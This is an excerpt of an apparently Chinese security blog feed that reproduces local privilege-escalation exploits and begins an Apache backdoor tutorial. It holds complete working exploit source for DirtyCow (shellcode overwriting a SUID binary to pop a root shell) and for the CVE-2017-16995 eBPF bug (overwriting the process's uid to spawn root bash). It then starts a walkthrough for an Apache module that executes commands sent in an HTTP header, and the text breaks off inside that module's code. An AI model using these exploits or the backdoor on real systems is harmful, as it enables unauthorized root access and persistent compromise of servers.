0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x56,</div><div class="line">  0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05</div><div class="line">&#125;;</div><div class="line">unsigned int sc_len = 258;</div><div class="line"></div><div class="line"></div><div class="line">void *madviseThread(void *arg)</div><div class="line">&#123;</div><div class="line">    char *str;</div><div class="line">    str=(char*)arg;</div><div class="line">    int i,c=0;</div><div class="line">    for(i=0;i&lt;1000000 &amp;&amp; !stop;i++) &#123;</div><div class="line">        c+=madvise(map,100,MADV_DONTNEED);</div><div class="line">    &#125;</div><div class="line">    printf(&quot;thread stopped\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void *procselfmemThread(void *arg)</div><div class="line">&#123;</div><div class="line">    char *str;</div><div class="line">    str=(char*)arg;</div><div class="line">    int f=open(&quot;/proc/self/mem&quot;,O_RDWR);</div><div class="line">    int i,c=0;</div><div class="line">    for(i=0;i&lt;1000000 &amp;&amp; !stop;i++) &#123;</div><div class="line">        lseek(f,map,SEEK_SET);</div><div class="line">        c+=write(f, str, sc_len);</div><div class="line">    &#125;</div><div class="line">    printf(&quot;thread stopped\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void *waitForWrite(void *arg) &#123;</div><div class="line">    char buf[sc_len];</div><div class="line"></div><div class="line">    for(;;) &#123;</div><div class="line">        FILE *fp = fopen(suid_binary, &quot;rb&quot;);</div><div class="line"></div><div class="line">        fread(buf, sc_len, 1, fp);</div><div class="line"></div><div class="line">        if(memcmp(buf, sc, sc_len) == 0) &#123;</div><div class="line">            printf(&quot;%s overwritten\n&quot;, suid_binary);</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        fclose(fp);</div><div class="line">        sleep(1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    stop = 1;</div><div class="line"></div><div class="line">    printf(&quot;Popping root shell.\n&quot;);</div><div class="line">    printf(&quot;Don&apos;t worry,/usr/bin/passwd has been restored.\n&quot;);</div><div class="line"></div><div class="line">    system(suid_binary);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc,char *argv[]) &#123;</div><div class="line">    char *backup;</div><div class="line"></div><div class="line">    printf(&quot;DirtyCow root privilege escalation\n&quot;);</div><div class="line">    printf(&quot;Backing up %s to /tmp/bak\n&quot;, suid_binary);</div><div class="line"></div><div class="line">    asprintf(&amp;backup, &quot;cp %s /tmp/bak&quot;, suid_binary);</div><div class="line">    system(backup);</div><div class="line"></div><div class="line">    f = open(suid_binary,O_RDONLY);</div><div class="line">    fstat(f,&amp;st);</div><div class="line"></div><div class="line">    printf(&quot;Size of binary: %d\n&quot;, st.st_size);</div><div class="line"></div><div class="line">    char payload[st.st_size];</div><div class="line">    memset(payload, 0x90, st.st_size);</div><div class="line">    memcpy(payload, sc, sc_len+1);</div><div class="line"></div><div class="line">    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);</div><div class="line"></div><div class="line">    printf(&quot;Racing, this may take a while..\n&quot;);</div><div class="line"></div><div class="line">    pthread_create(&amp;pth1, NULL, &amp;madviseThread, suid_binary);</div><div class="line">    pthread_create(&amp;pth2, NULL, &amp;procselfmemThread, payload);</div><div class="line">    pthread_create(&amp;pth3, NULL, &amp;waitForWrite, NULL);</div><div class="line"></div><div class="line">    pthread_join(pth3, NULL);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后编译执行就好了。<br><img src="https://i.imgur.com/xtDv4PR.png" alt=""><br>Kali版本：<br><img src="https://i.imgur.com/TPjOgBX.png" alt=""></p><p>还找到一个存着好几个脏牛poc的博客：<br><a href="http://www.5kik.com/tiquan/541.html" target="_blank" rel="external">http://www.5kik.com/tiquan/541.html</a></p><p>(为了做这个实验，poc试了好几个，虚拟机无限重启啊。。)<br><br></p><h1 id="Ubuntu本地提权CVE-2017-16995"><a href="#Ubuntu本地提权CVE-2017-16995" class="headerlink" title="Ubuntu本地提权CVE-2017-16995"></a>Ubuntu本地提权CVE-2017-16995</h1><p><strong>影响版本</strong><br>Linux Kernel Version 4.14-4.4 （主要影响Debian和Ubuntu发行版，Redhat和CentOS不受影响）</p><p><strong>修复和缓解建议</strong><br><code># echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled</code></p><p><strong>在vps上复现</strong><br>内核版本：<br><img src="https://i.imgur.com/DE2Xebu.png" alt=""><br>POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line"> * Ubuntu 16.04.4 kernel priv esc</div><div class="line"> *</div><div class="line"> * all credits to @bleidl</div><div class="line"> * - vnik</div><div class="line"> */</div><div class="line"></div><div class="line">// Tested on:</div><div class="line">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</div><div class="line">// if different kernel adjust CRED offset + check kernel stack size</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;errno.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;linux/bpf.h&gt;</div><div class="line">#include &lt;linux/unistd.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;sys/un.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line"></div><div class="line">#define PHYS_OFFSET 0xffff880000000000</div><div class="line">#define CRED_OFFSET 0x5f8</div><div class="line">#define UID_OFFSET 4</div><div class="line">#define LOG_BUF_SIZE 65536</div><div class="line">#define PROGSIZE 328</div><div class="line"></div><div class="line">int sockets[2];</div><div class="line">int mapfd, progfd;</div><div class="line"></div><div class="line">char *__prog = &quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</div><div class="line">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</div><div class="line">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</div><div class="line">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</div><div class="line">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</div><div class="line">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</div><div class="line">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</div><div class="line">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</div><div class="line">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</div><div class="line">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</div><div class="line">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</div><div class="line">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</div><div class="line">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</div><div class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;;</div><div class="line"></div><div class="line">char bpf_log_buf[LOG_BUF_SIZE];</div><div class="line"></div><div class="line">static int bpf_prog_load(enum bpf_prog_type prog_type,</div><div class="line">  const struct bpf_insn *insns, int prog_len,</div><div class="line">  const char *license, int kern_version) &#123;</div><div class="line">union bpf_attr attr = &#123;</div><div class="line">.prog_type = prog_type,</div><div class="line">.insns = (__u64)insns,</div><div class="line">.insn_cnt = prog_len / sizeof(struct bpf_insn),</div><div class="line">.license = (__u64)license,</div><div class="line">.log_buf = (__u64)bpf_log_buf,</div><div class="line">.log_size = LOG_BUF_SIZE,</div><div class="line">.log_level = 1,</div><div class="line">&#125;;</div><div class="line"></div><div class="line">attr.kern_version = kern_version;</div><div class="line"></div><div class="line">bpf_log_buf[0] = 0;</div><div class="line"></div><div class="line">return syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));</div><div class="line">&#125;</div><div class="line"></div><div class="line">static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,</div><div class="line">   int max_entries) &#123;</div><div class="line">union bpf_attr attr = &#123;</div><div class="line">.map_type = map_type,</div><div class="line">.key_size = key_size,</div><div class="line">.value_size = value_size,</div><div class="line">.max_entries = max_entries</div><div class="line">&#125;;</div><div class="line"></div><div class="line">return syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));</div><div class="line">&#125;</div><div class="line"></div><div class="line">static int bpf_update_elem(uint64_t key, uint64_t value) &#123;</div><div class="line">union bpf_attr attr = &#123;</div><div class="line">.map_fd = mapfd,</div><div class="line">.key = (__u64)&amp;key,</div><div class="line">.value = (__u64)&amp;value,</div><div class="line">.flags = 0,</div><div class="line">&#125;;</div><div class="line"></div><div class="line">return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));</div><div class="line">&#125;</div><div class="line"></div><div class="line">static int bpf_lookup_elem(void *key, void *value) &#123;</div><div class="line">union bpf_attr attr = &#123;</div><div class="line">.map_fd = mapfd,</div><div class="line">.key = (__u64)key,</div><div class="line">.value = (__u64)value,</div><div class="line">&#125;;</div><div class="line"></div><div class="line">return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void __exit(char *err) &#123;</div><div class="line">fprintf(stderr, &quot;error: %s\n&quot;, err);</div><div class="line">exit(-1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void prep(void) &#123;</div><div class="line">mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);</div><div class="line">if (mapfd &lt; 0)</div><div class="line">__exit(strerror(errno));</div><div class="line"></div><div class="line">progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</div><div class="line">(struct bpf_insn *)__prog, PROGSIZE, &quot;GPL&quot;, 0);</div><div class="line"></div><div class="line">if (progfd &lt; 0)</div><div class="line">__exit(strerror(errno));</div><div class="line"></div><div class="line">if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))</div><div class="line">__exit(strerror(errno));</div><div class="line"></div><div class="line">if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0)</div><div class="line">__exit(strerror(errno));</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void writemsg(void) &#123;</div><div class="line">char buffer[64];</div><div class="line"></div><div class="line">ssize_t n = write(sockets[0], buffer, sizeof(buffer));</div><div class="line"></div><div class="line">if (n &lt; 0) &#123;</div><div class="line">perror(&quot;write&quot;);</div><div class="line">return;</div><div class="line">&#125;</div><div class="line">if (n != sizeof(buffer))</div><div class="line">fprintf(stderr, &quot;short write: %lu\n&quot;, n);</div><div class="line">&#125;</div><div class="line"></div><div class="line">#define __update_elem(a, b, c) \</div><div class="line">bpf_update_elem(0, (a)); \</div><div class="line">bpf_update_elem(1, (b)); \</div><div class="line">bpf_update_elem(2, (c)); \</div><div class="line">writemsg();</div><div class="line"></div><div class="line">static uint64_t get_value(int key) &#123;</div><div class="line">uint64_t value;</div><div class="line"></div><div class="line">if (bpf_lookup_elem(&amp;key, &amp;value))</div><div class="line">__exit(strerror(errno));</div><div class="line"></div><div class="line">return value;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static uint64_t __get_fp(void) &#123;</div><div class="line">__update_elem(1, 0, 0);</div><div class="line"></div><div class="line">return get_value(2);</div><div class="line">&#125;</div><div class="line"></div><div class="line">static uint64_t __read(uint64_t addr) &#123;</div><div class="line">__update_elem(0, addr, 0);</div><div class="line"></div><div class="line">return get_value(2);</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void __write(uint64_t addr, uint64_t val) &#123;</div><div class="line">__update_elem(2, addr, val);</div><div class="line">&#125;</div><div class="line"></div><div class="line">static uint64_t get_sp(uint64_t addr) &#123;</div><div class="line">return addr &amp; ~(0x4000 - 1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void pwn(void) &#123;</div><div class="line">uint64_t fp, sp, task_struct, credptr, uidptr;</div><div class="line"></div><div class="line">fp = __get_fp();</div><div class="line">if (fp &lt; PHYS_OFFSET)</div><div class="line">__exit(&quot;bogus fp&quot;);</div><div class="line"></div><div class="line">sp = get_sp(fp);</div><div class="line">if (sp &lt; PHYS_OFFSET)</div><div class="line">__exit(&quot;bogus sp&quot;);</div><div class="line"></div><div class="line">task_struct = __read(sp);</div><div class="line"></div><div class="line">if (task_struct &lt; PHYS_OFFSET)</div><div class="line">__exit(&quot;bogus task ptr&quot;);</div><div class="line"></div><div class="line">printf(&quot;task_struct = %lx\n&quot;, task_struct);</div><div class="line"></div><div class="line">credptr = __read(task_struct + CRED_OFFSET); // cred</div><div class="line"></div><div class="line">if (credptr &lt; PHYS_OFFSET)</div><div class="line">__exit(&quot;bogus cred ptr&quot;);</div><div class="line"></div><div class="line">uidptr = credptr + UID_OFFSET; // uid</div><div class="line">if (uidptr &lt; PHYS_OFFSET)</div><div class="line">__exit(&quot;bogus uid ptr&quot;);</div><div class="line"></div><div class="line">printf(&quot;uidptr = %lx\n&quot;, uidptr);</div><div class="line">__write(uidptr, 0); // set both uid and gid to 0</div><div class="line"></div><div class="line">if (getuid() == 0) &#123;</div><div class="line">printf(&quot;spawning root shell\n&quot;);</div><div class="line">system(&quot;/bin/bash&quot;);</div><div class="line">exit(0);</div><div class="line">&#125;</div><div class="line"></div><div class="line">__exit(&quot;not vulnerable?&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line">prep();</div><div class="line">pwn();</div><div class="line"></div><div class="line">return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/mTYzuNn.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;该文章参考安全牛课堂：&lt;a href=&quot;https://edu.aqniu.com/my/course/415&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://edu.aqniu.com/my/course/415&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://Err0rzz.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu下Apache2开启/关闭模板方法</title>
    <link href="http://Err0rzz.github.io/2018/03/09/Ubuntu%E4%B8%8BApache2%E5%BC%80%E5%90%AF-%E5%85%B3%E9%97%AD%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95/"/>
    <id>http://Err0rzz.github.io/2018/03/09/Ubuntu下Apache2开启-关闭模板方法/</id>
    <published>2018-03-09T10:37:39.000Z</published>
    <updated>2018-03-12T14:09:46.582Z</updated>
    
    <content type="html"><![CDATA[<p>在复现Apache请求头后门的实验的时候，用apxs来安装了个扩展模块，可是怎么禁用不会，就百度了一波</p><a id="more"></a><p>在复现Apache请求头后门的实验的时候，用apxs来安装了个扩展模块，可是怎么禁用不会，就百度了一波，然后看了好几个都说什么httpd.conf配置文件来配置，但是Debian下的apache好像没有这个文件，主配置文件就是/etc/apache2/apache.conf，然后观察这个文件也没发现怎么禁用modules。</p><p>这里记录一下简单的命令开开启/禁用吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/etc/apache2/mods-enabled/ 已经被启用的模块</div><div class="line">/etc/apache2/mods-available/ 当前系统中可用的模块</div></pre></td></tr></table></figure><p>然后你就可以是用以下两个命令来启用或者关闭各个模块：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a2enmod 模块名 ---启用某模块</div><div class="line">a2dismod 模块名 ----禁用某模块</div></pre></td></tr></table></figure></p><p>比如你要开启rewrite模块，命令就是这样的： a2enmod rewrite,关闭rewirte模块命令就是这样子的：a2dismod rewrite。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在复现Apache请求头后门的实验的时候，用apxs来安装了个扩展模块，可是怎么禁用不会，就百度了一波&lt;/p&gt;
    
    </summary>
    
    
      <category term="环境配置" scheme="http://Err0rzz.github.io/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>Apache HTTP Server 后门开发</title>
    <link href="http://Err0rzz.github.io/2018/03/05/Apache-HTTP-Server-%E5%90%8E%E9%97%A8%E5%BC%80%E5%8F%91/"/>
    <id>http://Err0rzz.github.io/2018/03/05/Apache-HTTP-Server-后门开发/</id>
    <published>2018-03-05T08:24:05.000Z</published>
    <updated>2018-03-09T11:22:55.934Z</updated>
    
    <content type="html"><![CDATA[<p>复现一下一航大佬的博客里的实验。<br><a id="more"></a></p><p>参考文档：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://www.jianshu.com/p/9d9248922508</div><div class="line">https://httpd.apache.org/docs/2.4/developer/modguide.html</div></pre></td></tr></table></figure></p><h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>实现任意命令的功能<br>在目标服务器上安装一个后门，使得其对http请求头中的特定键-值产生反应，从而执行我们构造的命令。</p><p>例如，我们使目标服务器对zz这个键产生反应，去执行zz所对应的值的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GET / HTTP/1.1</div><div class="line">Host: localhost</div><div class="line">Cookie: key=value</div><div class="line">zz: COMMAND</div></pre></td></tr></table></figure></p><p>如果服务器收到该请求头，则执行COMMAND。</p><p>为了实现以上功能，我们需要完成接下来几步：</p><ul><li>Apache扩展结构</li><li>服务器获取一个HTTP请求的所有请求头</li><li>执行系统命令并且获取结果<br><br><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1>1.使用apxs来实现apache的扩展，先生成一个基本的模板结构<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apxs -g -n backdoor</div></pre></td></tr></table></figure></li></ul><p><img src="https://i.imgur.com/MA5raqF.png" alt=""></p><p>2.通过apache文档可以看到，客户端所有的请求头都可以通过<strong>r-&gt;headers_in</strong>获得<br><img src="https://i.imgur.com/oITokNt.png" alt=""></p><p>其实在文档里，官方也给出了遍历所有请求头的代码<br><img src="https://i.imgur.com/wC6CHlA.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">static int example_handler(request_rec *r)</div><div class="line">&#123;</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line">    const apr_array_header_t    *fields;</div><div class="line">    int                         i;</div><div class="line">    apr_table_entry_t           *e = 0;</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line"></div><div class="line">    fields = apr_table_elts(r-&gt;headers_in);</div><div class="line">    e = (apr_table_entry_t *) fields-&gt;elts;</div><div class="line">    for(i = 0; i &lt; fields-&gt;nelts; i++) &#123;</div><div class="line">        ap_rprintf(r, &quot;%s: %s\n&quot;, e[i].key, e[i].val);</div><div class="line">    &#125;</div><div class="line">    return OK;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>所以我们只需要看一下请求头里有没有出现Backdoor，然后进行操作就好了。</p><p>然后差不多对着敲一下代码(其实大部分都是原来mod_backdoor.c的代码，添加了一部分自己的代码)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line">**  mod_backdoor.c -- Apache sample backdoor module</div><div class="line">**  [Autogenerated via ``apxs -n backdoor -g&apos;&apos;]</div><div class="line">**</div><div class="line">**  To play with this sample module first compile it into a</div><div class="line">**  DSO file and install it into Apache&apos;s modules directory</div><div class="line">**  by running:</div><div class="line">**</div><div class="line">**    $ apxs -c -i mod_backdoor.c</div><div class="line">**</div><div class="line">**  Then activate it in Apache&apos;s apache2.conf file for instance</div><div class="line">**  for the URL /backdoor in as follows:</div><div class="line">**</div><div class="line">**    #   apache2.conf</div><div class="line">**    LoadModule backdoor_module modules/mod_backdoor.so</div><div class="line">**    &lt;Location /backdoor&gt;</div><div class="line">**    SetHandler backdoor</div><div class="line">**    &lt;/Location&gt;</div><div class="line">**</div><div class="line">**  Then after restarting Apache via</div><div class="line">**</div><div class="line">**    $ apachectl restart</div><div class="line">**</div><div class="line">**  you immediately can request the URL /backdoor and watch for the</div><div class="line">**  output of this module. This can be achieved for instance via:</div><div class="line">**</div><div class="line">**    $ lynx -mime_header http://localhost/backdoor</div><div class="line">**</div><div class="line">**  The output should be similar to the following one:</div><div class="line">**</div><div class="line">**    HTTP/1.1 200 OK</div><div class="line">**    Date: Tue, 31 Mar 